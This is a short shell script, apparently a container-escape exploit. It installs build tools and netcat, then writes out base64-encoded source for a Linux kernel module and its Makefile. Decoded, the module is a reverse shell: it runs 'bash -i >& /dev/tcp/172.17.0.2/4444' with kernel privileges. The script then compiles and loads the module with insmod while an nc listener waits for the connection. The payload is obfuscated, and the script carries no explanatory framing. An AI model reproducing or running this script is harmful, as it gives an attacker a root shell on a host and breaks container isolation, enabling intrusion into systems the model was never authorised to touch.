apt update && apt install -y build-essential \
							 net-tools \
							 libcap2 \
							 netcat
							 
capsh --print  # Check capabilities
ifconfig    # Check the IP address of the host machine

echo "b2JqLW0gKz1rZXJuZWxfcnJzaGVsbC5vCgphbGw6CgltYWtlIC1DIC9saWIvbW9kdWxlcy8kKHNoZWxsIHVuYW1lIC1yKS9idWlsZCBNPSQoUFdEKSBtb2R1bGVzCgpjbGVhbjoKCW1ha2UgLUMgL2xpYi9tb2R1bGVzLyQoc2hlbGwgdW5hbWUgLXIpL2J1aWxkIE09JChQV0QpIGNsZWFu" |base64 -d >> Makefile

echo "I2luY2x1ZGUgPGxpbnV4L2ttb2QuaD4KI2luY2x1ZGUgPGxpbnV4L21vZHVsZS5oPgoKTU9EVUxFX0xJQ0VOU0UoIkdQTCIpOwpNT0RVTEVfQVVUSE9SKCJsbXJpY2NhcmRvIik7Ck1PRFVMRV9ERVNDUklQVElPTigiTEtNIHJldmVyc2Ugc2hlbGwgbW9kdWxlIik7Ck1PRFVMRV9WRVJTSU9OKCIxLjAiKTsKCmNoYXIgKmFyZ3ZbXSA9IHsKICAgICIvYmluL2Jhc2giLCAiLWMiLAogICAgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTcyLjE3LjAuMi80NDQ0IDI+JjEiLAogICAgIk5VTEwiCn07CgpzdGF0aWMgY2hhciogZW52cFtdID0gewogICAgIlBBVEg9L3Vzci9sb2NhbC9zYmluOi91c3IvbG9jYWwvYmluOi91c3Ivc2JpbjovdXNyL2Jpbjovc2JpbjovYmluIiwKICAgICJOVUxMIgp9OwoKc3RhdGljIGludCBfX2luaXQgcmV2ZXJzZV9zaGVsbF9pbml0KHZvaWQpIHsKICAgIHJldHVybiBjYWxsX3VzZXJtb2RlaGVscGVyKGFyZ3ZbMF0sIGFyZ3YsIGVudnAsIFVNSF9XQUlUX0VYRUMpOwp9CgpzdGF0aWMgdm9pZCBfX2V4aXQgcmV2ZXJzZV9zaGVsbF9leGl0KHZvaWQpIHsKICAgIHByaW50ayhLRVJOX0lORk8gIkV4aXRpbmcgXG4iKTsKfQoKbW9kdWxlX2luaXQocmV2ZXJzZV9zaGVsbF9pbml0KTsKbW9kdWxlX2V4aXQocmV2ZXJzZV9zaGVsbF9leGl0KTsK" |base64 -d >> kernel_rrshell.c

make

nc -lnvp 4444
insmod kernel_rrshell.ko  # run the kernel module
fg  # retrieve the backgroud connection
